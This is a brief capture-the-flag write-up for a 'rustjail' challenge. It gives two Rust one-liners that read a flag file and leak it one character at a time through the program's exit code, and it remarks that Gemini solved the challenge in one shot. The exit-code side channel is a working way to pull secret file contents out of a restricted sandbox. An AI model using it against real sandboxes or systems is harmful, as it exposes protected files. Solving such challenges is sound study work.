# rustjail solve

```
fn main() {std::process::exit(std::fs::read_to_string("flag").unwrap().chars().nth(0).unwrap() as i32)}
```

intended solution looks something like above but do it replacing 0 until you extract entire flag

use exit to leak flag chars

```
fn main() { std::process::exit(std::fs::read("flag.txt").unwrap().get(0).unwrap().clone().into()) }
```

gemini one-shot :sob: ai is a big problem

